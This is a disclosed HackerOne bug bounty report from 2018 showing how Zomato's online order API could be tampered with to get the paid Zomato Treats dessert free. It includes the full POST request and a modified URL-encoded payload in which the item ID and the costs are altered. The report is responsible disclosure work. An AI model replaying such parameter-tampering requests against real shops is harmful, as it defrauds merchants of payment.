# [www.zomato.com] Getting a complimentary dessert [Zomato Treats] on ordering a Meal at no cost

## Report Details
- **Report ID**: 321938
- **URL**: https://hackerone.com/reports/321938
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-05T04:54:29.802Z
- **Disclosed**: 2018-04-25T12:26:28.033Z

## Reporter
- **Username**: harsh13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
1. Go to order food tab and select any restaurant that delivers online.
2. Add Zomato Treat Subscription to cart.
3. Add more items to cart to fulfil the minimum order requirement for that restaurant.
4. Click on Continue and proceed to pay online.
5. While paying online I faced the issue that "some items in your cart have been changed" and was unable to pay. If you face the same issue toggle between Card Payment and Netbanking 1-2 times and then pay via Netbanking.

The final api for order is:

POST https://www.zomato.com/php/o2_handler.php

Host: www.zomato.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 3277
Cookie:  YOUR COOKIES HERE
Connection: close

case=makeonlineorder&res_id=██████&order=███

total_cost%22%3A%22254.32%22%2C%22type%22%3A%22total%22%2C%22unit_cost%22%3A0%2C%22quantity%22%3A0%2C%22comment%22%3Anull%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A0%2C%22mrp_item%22%3A0%2C%22tax_inclusive%22%3A0%2C%22tags%22%3A%22%22%2C%22tax_id%22%3A0%2C%22id%22%3A0%2C%22

display_cost%22%3A%22%E2%82%B9254.32%22%7D%5D%2C%22dishes%22%3A%5B%7B%22type%22%3A%22dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A390080785%2C%22item_name%22%3A%22Poha%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A2%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A59%2C%22total_cost%22%3A118%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A0%2C%22duration_id%22%3A0%7D%2C%7B%22type%22%3A%22plan%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22

item_id%22%3A3%2C%22item_name%22%3A%22Zomato%20Treats%20Membership%22%2C%22mrp_item%22%3A1%2C%22quantity%22%3A1%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A149%2C%22total_cost%22%3A149%2C%22

is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A4%7D%2C%7B%22type%22%3A%22treat_dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A407847609%2C%22item_name%22%3A%22Banana%20Cake%20-%20Treats%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A1%2C%22tags%22%3A%2220%2C24%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A60%2C%22total_cost%22%3A60%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A0%7D%5D%7D&address_id=██████&phone=█████&phone_country_id=1&name=Russel&special_instructions=&user_forced=0&verify_phone=0&payment_method_id=██████████&payment_method_type=netbanking&card_token=0&card_name=&card_bin=&card_vault=winecellar&recharge=0&recharge_amount=0&recharge_method_type=&additional_recharge=0&additional_recharge_amount=0&voucher_code=&wallet_type=self&dob=&csrfToken=db465772ce05763ac9082da5ec8cef1b&csrft_creation_time=1520220575093


6. The item id on the separate line is the id corresponding to Zomato Treats with a price of Rs.149. On trying more item_ids, I figured out that there are more order ids for Zomato Treats, and have a price of 0.

7. I changed the item_id to 18, the unit_cost to 0, and subtracted 149(Zomato Treats Cost) from the total cost. Initial total cost: 254, final total cost: 105.

8. So ,the new payload becomes:

case=makeonlineorder&res_id=█████&order=██████

###TOTAL COST CHANGED to 105
total_cost%22%3A%22105.32%22%2C%22type%22%3A%22total%22%2C%22unit_cost%22%3A0%2C%22quantity%22%3A0%2C%22comment%22%3Anull%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A0%2C%22mrp_item%22%3A0%2C%22tax_inclusive%22%3A0%2C%22tags%22%3A%22%22%2C%22tax_id%22%3A0%2C%22id%22%3A0%2C%22

display_cost%22%3A%22%E2%82%B9254.32%22%7D%5D%2C%22dishes%22%3A%5B%7B%22type%22%3A%22dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A390080785%2C%22item_name%22%3A%22Poha%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A2%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A59%2C%22total_cost%22%3A118%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A0%2C%22duration_id%22%3A0%7D%2C%7B%22type%22%3A%22plan%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22

### ITEM Id changed to 18 and total and unit cost changed to 0
item_id%22%3A18%2C%22item_name%22%3A%22Zomato%20Treats%20Membership%22%2C%22mrp_item%22%3A1%2C%22quantity%22%3A1%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22
unit_cost%22%3A0%2C%22total_cost%22%3A0%2C%22

is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A4%7D%2C%7B%22type%22%3A%22treat_dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A407847609%2C%22item_name%22%3A%22Banana%20Cake%20-%20Treats%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A1%2C%22tags%22%3A%2220%2C24%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A60%2C%22total_cost%22%3A60%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A0%7D%5D%7D&address_id=█████████&phone=██████████&phone_country_id=1&name=Russel&special_instructions=&user_forced=0&verify_phone=0&payment_method_id=████&payment_method_type=netbanking&card_token=0&card_name=&card_bin=&card_vault=winecellar&recharge=0&recharge_amount=0&recharge_method_type=&additional_recharge=0&additional_recharge_amount=0&voucher_code=&wallet_type=self&dob=&csrfToken=db465772ce05763ac9082da5ec8cef1b&csrft_creation_time=1520220575093

9. Complete the transaction and your order will be placed.

10. PFA the screenshot of the order that shows free banana treats. 

11. Using this I was not subscribed to Zomato Treats Subscription, but still can get free treats.

## Impact

Anyone can order free treats from Zomato.

## Attachments
No attachments
